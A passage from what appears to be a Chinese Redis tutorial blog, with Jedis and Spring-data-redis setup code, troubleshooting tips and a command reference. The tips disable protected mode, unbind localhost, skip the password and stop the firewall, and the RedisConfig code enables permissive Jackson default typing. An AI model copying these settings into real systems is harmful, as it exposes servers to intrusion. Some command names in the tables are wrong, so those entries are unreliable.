</span><br><span class="line"># redis服务器地址</span><br><span class="line">host=<span class="number">192.168</span><span class="number">.30</span><span class="number">.0</span> </span><br><span class="line"># redis开放端口</span><br><span class="line">port=<span class="number">6379</span>             </span><br></pre></td></tr></table></figure><p>类<code>JedisUtils.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPool;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPoolConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JedisUtils</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建一个连接池</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JedisPool jedisPool;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="comment">//读取配置文件</span></span><br><span class="line">        InputStream is = JedisUtils.class.getClassLoader().getResourceAsStream(<span class="string">&quot;jedis.properties&quot;</span>);</span><br><span class="line">        Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            pro.load(is);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//连接池配置</span></span><br><span class="line">        JedisPoolConfig config=<span class="keyword">new</span> JedisPoolConfig();</span><br><span class="line">        config.setMaxTotal(Integer.parseInt(pro.getProperty(<span class="string">&quot;maxTotal&quot;</span>)));</span><br><span class="line">        config.setMaxIdle(Integer.parseInt(pro.getProperty(<span class="string">&quot;maxIdle&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化连接池，把对应参数传递进去</span></span><br><span class="line">        jedisPool=<span class="keyword">new</span> JedisPool(config,pro.getProperty(<span class="string">&quot;host&quot;</span>), Integer.parseInt(pro.getProperty(<span class="string">&quot;port&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置好后返回，返回一个Jedis对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Jedis <span class="title">getJedis</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> jedisPool.getResource();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类<code>JedisTest.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Jedis jedis = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取连接池对象</span></span><br><span class="line">            jedis = JedisUtils.getJedis();</span><br><span class="line">            <span class="comment">//执行操作</span></span><br><span class="line">            jedis.set(<span class="string">&quot;java&quot;</span>, <span class="string">&quot;good&quot;</span>);</span><br><span class="line">            System.out.println(jedis.get(<span class="string">&quot;java&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (jedis != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//这里使用的close不代表关闭连接，指的是归还资源</span></span><br><span class="line">                jedis.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>Jedis<code>直连</code>与Jedis<code>连接池</code>使用的对比</p><table><thead><tr><th>方案</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>Jedis直连</td><td>简单方便<br>适用于连接数较少且使用时间较长，可构成长连接场景</td><td>存在每次新建/关闭TCP开销<br>资源无法控制，存在连接泄露的可能<br>Jedis对象线程不安全</td></tr><tr><td>Jedis连接池</td><td>Jedis预先生成，降低开销<br>连接池的形成保护和控制资源的使用</td><td>相对于直连，使用相对麻烦，尤其在资源管理上需要很多参数来保证，一旦规划不合理就会出现问题</td></tr></tbody></table></li></ol><h2 id="Spring-data-redis如何配置">Spring-data-redis如何配置</h2><ol><li>spring-data-redis引入依赖</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--        redis--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.6</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>添加配置文件<code>application.properties</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#Redis服务器地址</span><br><span class="line">spring.redis.host=<span class="number">192.168</span><span class="number">.30</span><span class="number">.0</span></span><br><span class="line">#Redis服务器连接端口（默认端口为<span class="number">6379</span>）</span><br><span class="line">spring.redis.port=<span class="number">6379</span></span><br><span class="line">#Redis数据库索引（默认位<span class="number">0</span>）</span><br><span class="line">spring.redis.database=<span class="number">0</span></span><br><span class="line">#连接超时时间（毫秒）</span><br><span class="line">spring.redis.timeout=<span class="number">1800000</span></span><br><span class="line">#连接池最大连接数（使用负值表示没有限制）</span><br><span class="line">spring.redis.lettuce.pool.max-active=<span class="number">20</span></span><br><span class="line">#最大阻塞等待时间（复数表示没有限制）</span><br><span class="line">spring.redis.lettuce.pool.max-wait=-<span class="number">1</span></span><br><span class="line">#连接池中的最大空闲连接</span><br><span class="line">spring.redis.lettuce.pool.max-idle=<span class="number">5</span></span><br><span class="line">#连接池中的最小空闲连接</span><br><span class="line">spring.redis.lettuce.pool.min-idle=<span class="number">0</span></span><br></pre></td></tr></table></figure><ol start="3"><li>添加Redis配置类<code>RedisConfig.java</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableCaching</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title">redisTemplate</span><span class="params">(RedisConnectionFactory factory)</span> </span>&#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> RedisTemplate();</span><br><span class="line">        RedisSerializer&lt;String&gt; redisSerializer = <span class="keyword">new</span> StringRedisSerializer();</span><br><span class="line">        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = <span class="keyword">new</span> Jackson2JsonRedisSerializer(Object.class);</span><br><span class="line">        ObjectMapper om = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        om.activateDefaultTyping(LaissezFaireSubTypeValidator.instance ,</span><br><span class="line">                ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(om);</span><br><span class="line">        template.setConnectionFactory(factory);</span><br><span class="line">        template.setKeySerializer(redisSerializer);</span><br><span class="line">        template.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        template.setHashValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CacheManager <span class="title">cacheManager</span><span class="params">(RedisConnectionFactory factory)</span> </span>&#123;</span><br><span class="line">        RedisSerializer&lt;String&gt; redisSerializer = <span class="keyword">new</span> StringRedisSerializer();</span><br><span class="line">        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = <span class="keyword">new</span> Jackson2JsonRedisSerializer(Object.class);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        objectMapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance ,</span><br><span class="line">                ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(objectMapper);</span><br><span class="line">        RedisCacheConfiguration config = RedisCacheConfiguration.defaultCacheConfig()</span><br><span class="line">                .entryTtl(Duration.ofSeconds(<span class="number">600</span>))</span><br><span class="line">                .serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(redisSerializer))</span><br><span class="line">                .serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(jackson2JsonRedisSerializer))</span><br><span class="line">                .disableCachingNullValues();</span><br><span class="line">        RedisCacheManager cacheManager = RedisCacheManager.builder(factory)</span><br><span class="line">                .cacheDefaults(config)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="keyword">return</span> cacheManager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li>创建Controller试验一下</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/redisTest&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisTestControllor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testRedis</span><span class="params">()</span></span>&#123;</span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;zeker&quot;</span>);</span><br><span class="line">        String name = (String) redisTemplate.opsForValue().get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>根据自己开设的端口访问<code>http://localhost:8080/redisTest</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210806/666ae2ea6a519635d9932f43f286144.mt0bja0dxmo.png" alt="1"></p><h2 id="常见问题及解决方法">常见问题及解决方法</h2><div class="note info no-icon flat"><p>Could not get a resource from the pool; nested exception is io.lettuce.core.RedisConnectionException: Unable to connect to 192.168.30.0:6379</p></div><p>1、查看是否启动Redis服务器</p><p>2、查看目标IP地址是否可以ping通</p><p>3、Redis的配置application.yml（或application.properties）中spring.redis.timeout连接超时时间（毫秒）中设置不能为0</p><p>4、修改redis的配置文件redis.conf</p><ol><li>protected-mode yes 改为 protected-mode no<br>（该配置项表示是否开启保护模式，默认是开启，开启后Redis只会本地进行访问，拒绝外部访问）</li><li>注释掉 bin127.0.0.1 即 #bin 127.0.0.1<br>（PS: 不注释掉，表示指定 Redis 只接收来自于该 IP 地址的请求，注释掉后，则表示将处理所有请求）</li></ol><div class="note warning flat"><p>修改配置文件redis.conf后记得保存重启redis</p></div><p>5、如果在Redis中没有配置requirepass，那么在application.properties（或application.yaml）中就不要写spring.redis.password</p><p>6、开放对应端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --add-port=6379/tcp# 开放6379端口号</span><br><span class="line">firewall-cmd --query-port=6379/tcp# 查看端口号是否打开</span><br></pre></td></tr></table></figure><div class="note info no-icon flat"><p>PS：云服务器需在安全组中设置对应端口号，不建议开放所有端口。在<code>虚拟机上测试</code>也可以选择关闭防火墙<code>systemctl stop firewalld</code>。</p></div><h2 id="总结">总结</h2><p><code>Jedis</code>是Redis官方推荐的面向Java的操作Redis的客户端，而<code>RedisTemplate</code>是<code>Spring-data-redis</code>中对<code>Jedis</code>Api的高度封装。</p><p><code>Spring-data-redis</code>相对于Jedis来说可以方便地更换Redis的Java客户端，比Jedis多了自动管理连接池的特性，方便与其他Spring框架进行搭配使用</p><p>总体来说，<code>Jedis</code>，更像<code>spring 与 MySQL</code>结合，通过操作连接池，获取实例操作数据库，而<code>Spring-data-redis</code>与spring的整合，更像<code>spring 与 mybatis</code>整合，通过工厂，创建实例，再操作实例。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> Redis </tag>
            
            <tag> Spring boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis学习笔记（1）</title>
      <link href="/posts/d9238aea/"/>
      <url>/posts/d9238aea/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Redis键（key）">Redis键（key）</h2><table><thead><tr><th style="text-align:left">命令</th><th>描述</th></tr></thead><tbody><tr><td style="text-align:left">keys *</td><td>查看当前库所有key</td></tr><tr><td style="text-align:left">exists &lt;key&gt;</td><td>判断某个key是否存在</td></tr><tr><td style="text-align:left">type &lt;key&gt;</td><td>查看key是什么类型</td></tr><tr><td style="text-align:left">del &lt;key&gt;</td><td>删除指定的key数据</td></tr><tr><td style="text-align:left">expore &lt;key&gt; &lt;time&gt;</td><td>为给定的key设置过期时间time（单位秒）</td></tr><tr><td style="text-align:left">ttl &lt;key&gt;</td><td>查看还有多少秒过期，-1表示永不过期，-2表示已过期</td></tr><tr><td style="text-align:left">select &lt;index&gt;</td><td>切换当前数据库（共16个数据库，0为默认库）</td></tr><tr><td style="text-align:left">dbsize</td><td>查看当前数据库key的数量</td></tr><tr><td style="text-align:left">flushdb/flushall</td><td>清空当前库/全部库</td></tr></tbody></table><h2 id="Redis字符串（String）">Redis字符串（String）</h2><p><code>String</code>类型是二进制安全的，意味着Redis的<code>String</code>可包含任何数据，比如jpg图片或者序列化的对象。</p><p>一个Redis中字符串value最多可以是512M。</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>set &lt;key&gt; &lt;value&gt;</td><td>添加键值对</td></tr><tr><td>get &lt;key&gt;</td><td>查询对应键值</td></tr><tr><td>append &lt;key&gt; &lt;value&gt;</td><td>将给定的value追加到原值的末尾</td></tr><tr><td>strlen &lt;key&gt;</td><td>获得key的长度</td></tr><tr><td>setnx &lt;key&gt; &lt;value&gt;</td><td>只有在key不存在时，才能设置key的值</td></tr><tr><td>incr/decr &lt;key&gt;</td><td>将key中储存的数字值增/减（+/-） 1</td></tr><tr><td>incrby/decrby &lt;key&gt; &lt;步长&gt;</td><td>将key中储存的数字值增/减，自定义步长</td></tr><tr><td>mset &lt;key1&gt;&lt;value1&gt;&lt;key2&gt;&lt;value2&gt;…</td><td>同时设置一个或多个key-value对</td></tr><tr><td>mget &lt;key1&gt;&lt;key2&gt;…</td><td>同时获取一个或多个value</td></tr><tr><td>msetnx &lt;key1&gt;&lt;value1&gt;&lt;key2&gt;&lt;value2&gt;…</td><td>同时设置一个或多个key-value对，当且仅当所有给定key都不存在</td></tr><tr><td>getrange &lt;key&gt; &lt;起始位置&gt;&lt;结束位置&gt;</td><td>获得值的范围（全部：get key 0 -1）</td></tr><tr><td>setrange &lt;key&gt;&lt;起始位置&gt;&lt;value&gt;</td><td>用value覆写key所储存的字符串值，从起始位置开始（索引从0开始）</td></tr><tr><td>setnx &lt;key&gt; &lt;过期时间&gt;&lt;value&gt;</td><td>设置键值的同时，设置过期时间（单位秒）</td></tr><tr><td>getset&lt;key&gt;&lt;value&gt;</td><td>设置新值同时获得旧值</td></tr></tbody></table><h2 id="Redis列表（List）">Redis列表（List）</h2><p><strong>单键多值，双向链表</strong></p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>lpush/rpush &lt;key&gt; &lt;value1&gt; &lt;value2&gt;…</td><td>从左边/右边插入一个或多个值</td></tr><tr><td>lpop/rpop  &lt;key&gt;</td><td>从左边/右边吐出一个值。</td></tr><tr><td>rpoplpush  &lt;key1&gt; &lt;key2&gt;</td><td>从key1列表右边吐出一个值，查到key2列表右边</td></tr><tr><td>lrange &lt;key&gt; &lt;start&gt; &lt;stop&gt;</td><td>按照索引下标获得元素（从左到右）&lt;br&gt;（全部：lrange key 0 -1）</td></tr><tr><td>lindex &lt;key&gt; &lt;index&gt;</td><td>按照索引下标获得元素（从左到右）</td></tr><tr><td>llen &lt;key&gt;</td><td>获得列表的长度</td></tr><tr><td>linsert &lt;key&gt; before/after &lt;value&gt; &lt;newvalue&gt;</td><td>在value的前/后面插入newvalue值</td></tr><tr><td>lrem &lt;key&gt; &lt;n&gt; &lt;value&gt;</td><td>从左边删除n个value（从左到右）</td></tr><tr><td>lset &lt;key&gt; &lt;index&gt; &lt;value&gt;</td><td>将列表key下标为index的值替换成value</td></tr></tbody></table><h2 id="Redis集合（Set）">Redis集合（Set）</h2><p>Redis的集合<code>Set</code>是String类型的无序集合，与list类似是一个列表的功能，但<code>Set</code>可以自动数据排重。底层是一个value为<code>null</code>的hash表，所以添加、删除、查找的复杂度都为<code>O(1)</code>。</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>sadd &lt;key&gt; &lt;member1&gt; &lt;member2&gt;…</td><td>将一个或多个member元素加入到集合key中，已存在的member将被忽略</td></tr><tr><td>smembers &lt;key&gt;</td><td>取出该集合的所有值</td></tr><tr><td>sismember &lt;key&gt; &lt;member&gt;</td><td>判断集合key是否含有该member值，有则1，无则0</td></tr><tr><td>scard &lt;key&gt;</td><td>返回该集合的元素个数</td></tr><tr><td>srem &lt;key&gt; &lt;member1&gt; &lt;member2&gt;…</td><td>删除集合中的某个元素</td></tr><tr><td>spop &lt;key&gt;</td><td>随机从该集合中吐出一个值</td></tr><tr><td>srandmember &lt;key&gt; &lt;n&gt;</td><td>随机从该集合中取出n个值。值不会从集合中删除</td></tr><tr><td>smove &lt;source&gt; &lt;destination&gt;  &lt;member&gt;</td><td>把集合中的一个member值从一个集合移动到另一个集合中</td></tr><tr><td>sinter/sunion &lt;key1&gt; &lt;key2&gt;</td><td>返回两个集合的交集/并集元素</td></tr><tr><td>sdiff &lt;key1&gt; &lt;key2&gt;</td><td>返回两个集合的差集元素（key1中的，不包含key2中的）</td></tr></tbody></table><h2 id="Redis哈希（Hash）">Redis哈希（Hash）</h2><p>Redis的<code>Hash</code>是一个String类型的field和value的映射表，hash适合用于存储对象，类似Java中的<code>Map&lt;String, Object&gt;</code>。</p><p>当key存储的value过多时，往往为了提高查询效率，例如用户ID为key，field有姓名、年龄、职业等信息，这是我们可以选择通过key(用户ID)+field(属性标签)就可以操作对应属性的数据。</p><p>类似于map套娃：<code>&lt;String， &lt;Map&lt;key, value&gt;&gt;&gt;</code></p><div class="note green no-icon flat"><p>好处：既不需要重复存储数据，避免了数据冗余，也不会带来序列化和并发修改控制的问题。</p></div><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>hset &lt;key&gt; &lt;field&gt; &lt;value&gt;</td><td>给key集合中的field键赋值value，例：hset user:001 name zeker</td></tr><tr><td>hget &lt;key&gt; &lt;field&gt;</td><td>从key集合中的fild中取出value</td></tr><tr><td>hmset &lt;key&gt; &lt;field1&gt; &lt;value1&gt; &lt;field2&gt; &lt;value2&gt;…</td><td>批量设置hash的值</td></tr><tr><td>hexists &lt;key&gt; &lt;field&gt;</td><td>查看哈希表key中，给定field是否存在</td></tr><tr><td>hkeys &lt;key&gt;</td><td>列出该hash集合的所有field</td></tr><tr><td>hvals &lt;key&gt;</td><td>列出该hash集合的所有value</td></tr><tr><td>hincrby &lt;key&gt; &lt;field&gt; &lt;increment&gt;</td><td>为哈希表key中的field的值加上增量increment（例：1 -1）</td></tr><tr><td>hsetnx &lt;key&gt; &lt;field&gt; &lt;value&gt;</td><td>将哈希表key中的field的值设置为value，当且仅当field不存在</td></tr></tbody></table><h2 id="Redis有序集合（Zset）">Redis有序集合（Zset）</h2><p>Redis有序集合<code>Zset</code>与普通集合Set相似，都是一个没有重复元素的字符串集合。</p><p>不同之处在于有序集合<code>Zset</code>的每个成员都关联了一个评分（score），这个评分（score）被用来按照从最低分到最高分的方式排序集合中的成员。</p><p>集合中的成员是唯一的，但评分可以是重复的。这里例子可以为：排行榜</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>zadd &lt;key&gt; &lt;score1&gt; &lt;member1&gt; &lt;score2&gt; &lt;member2&gt;…</td><td>将一个或多个memeber元素及其score值加入到有序集key中</td></tr><tr><td>zrange &lt;key&gt; &lt;start&gt; &lt;stop&gt; [withscores]</td><td>返回有序集key中，下标在start与stop之间的元素(withscores可让分数与值返回到结果集</td></tr><tr><td>zrangebyscore key min max [withscoers]  [limit offset count]</td><td>返回有序集key中，所有score值介于min和max之间（包括等于min或max）的成员，有序集成员按score值递增（从小到大）次序排列</td></tr><tr><td>zrevrangebyscore key max min [withscoers]  [limit offset count]</td><td>dev：反转。意思同上，次序从大到小排列</td></tr><tr><td>zincrby &lt;key&gt; &lt;increment&gt; &lt;member&gt;</td><td>为元素member的score加上增量increment</td></tr><tr><td>zrem &lt;key&gt; &lt;member&gt;</td><td>删除该集合下指定值的元素</td></tr><tr><td>zcount &lt;key&gt; &lt;min&gt; &lt;max&gt;</td><td>统计该集合中分数区间内的元素个数</td></tr><tr><td>zrank &lt;key&gt; &lt;member&gt;</td><td>返回该元素member在集合中的排名，从0开始</td></tr></tbody></table><p>Zset底层中使用了两种数据结构：hash表与跳跃表</p><ol><li>hash表，作用就是关联元素value和权重score，保障元素value的唯一值，可以通过元素value找到相应的score值。</li><li>跳跃表，目的在于给元素value排序，根据score的范围获取元素列表，从而比普通列表查询效率更快。</li></ol><h2 id="Redis新数据类型">Redis新数据类型</h2><h3 id="Bitmaps">Bitmaps</h3><p>Redis提供<code>Bitmaps</code>这个”数据类型“可以实现对位的操作：</p><p>（1）<code>Bitmaps</code>本身不是一种数据结构，实际上就是字符串，但是它可以对字符串的位进行操作。、</p><p>（2）<code>Bitmaps</code>单独提供了一套命令，所以在Redis中使用<code>Bitmaps</code>和使用字符串的方法不太相同。可以<code>Bitmaps</code>想象成一个以位为单位数组，数组中的每个单元只能存0或者1，数组的下标在<code>Bitmaps</code>中叫做偏移量。单个<code>Bitmaps</code>的最大长度是<code>512MB</code>，即<code>2^32</code>个比特位。</p><div class="note green no-icon flat"><p>合理地使用操作位能够有效地提高内存使用率和开发效率，并且可以极大地节省内存空间。<br>例如：用户访问，统计不同电话号码的个数以及布隆过滤法（URL的排重、垃圾邮箱地址的过滤）…</p></div><table><thead><tr><th>命令</th><th>描述</th><th></th></tr></thead><tbody><tr><td>setbit &lt;key&gt; &lt;offset&gt; &lt;value&gt;</td><td>设置Bitmaps中某个偏移量offset的值value</td><td></td></tr><tr><td>getbit &lt;key&gt; &lt;offset&gt;</td><td>获取Bitmaps中某个偏移量offset的值value</td><td></td></tr><tr><td>bitcount &lt;key&gt; [start end]</td><td>统计字符串从start字节到end字节比特值为1的数量</td><td></td></tr><tr><td>bitop and(or/not/xor) &lt;destkey&gt; [key…]</td><td>多个Bitmaps的and（交集）、or（并集）、not（非）、xor（异或）操作并将结果保存在destkey中</td><td></td></tr></tbody></table><h3 id="HyperLogLog">HyperLogLog</h3><div class="note default no-icon flat"><p>在工作当中，经常会遇到与统计相关的功能需求，比如统计网站PV（PageView页面访问量）,可以使用Redis的incr、incrby轻松实现。<br>但像UV（UniqueVisitor，独立访客）、独立IP数、搜索记录数等需要去重和计数的问题如何解决？而这种求集合中不重复元素个数的问题称为基数问题。</p></div><p>解决基数问题方案：</p><p>（1）数据存储在MySQL表中，使用distinct count计算不重复个数</p><p>（2）使用Redis提供的hash、set、bitmaps等数据结构来处理</p><p>以上的方案结果精确，但随着数据不断增加，导致占用空间越来越大，对于非常大的数据集是不切实际的。</p><p>为了能够降低一定的精度来平衡存储空间，Redis推出了HyperLogLog，一种用来做基数统计的算法。</p><p>其优点在于：</p><p>在输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定的、并且是很小的。</p><p>每个<code>HyperLogLog</code>键只需要花费 <code>12 KB</code>内存，就可以计算接近 <code>2^64</code> 个不同元素的<code>基数</code>。这和计算基数时，元素越多耗费内存就越多的集合形成鲜明对比。</p><div class="note info flat"><p>基数 = 数据集元素个数 - 重复数字个数</p></div><p>但是，因为<code>HyperLogLog</code>只会根据输入元素来计算基数，而不会储存输入元素本身，所以 <code>HyperLogLog</code>不能像集合那样，返回输入的各个元素。</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>padd &lt;key&gt; &lt;element&gt; [element…]</td><td>添加指定元素element到HyperLogLog中</td></tr><tr><td>pfcount &lt;key&gt; [key…]</td><td>计算key中的基数</td></tr><tr><td>pfmerge &lt;destkey&gt; &lt;sourcekey&gt; [sourcekey…]</td><td>将一个或多个key合并后的结果储存在另一个destkey中</td></tr></tbody></table><h3 id="Geospatital">Geospatital</h3><p><code>Redis GEO</code>，Geographic，地理信息的缩写。</p><p>主要用于存储地理位置信息，即经纬度（二维坐标），基于该类型，提供了经纬度设置，查询，范围查询，距离查询，经纬度Hash等常见操作。</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>geoadd &lt;key&gt; &lt;longitude&gt; &lt;latitude&gt; &lt;member&gt; [longitude latitude 